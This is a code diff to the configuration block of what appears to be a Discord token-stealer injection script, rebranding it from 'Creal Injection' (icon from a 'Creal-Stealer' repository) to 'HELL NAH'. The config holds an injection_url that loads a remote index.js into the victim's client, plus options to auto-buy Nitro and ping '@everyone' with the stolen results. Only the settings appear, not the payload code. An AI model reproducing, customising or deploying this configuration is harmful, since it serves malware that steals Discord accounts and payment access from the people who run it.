@@ -11,8 +11,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Creal Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg'.replace(/ /g, '%20'), 
+  embed_name: 'HELL NAH', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1137542250415538226/1148377744053375006/Screenshot_20230904_112100_YouTube.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/vincyxiroff/botvps-discord/main/p/index.js', 
   /**
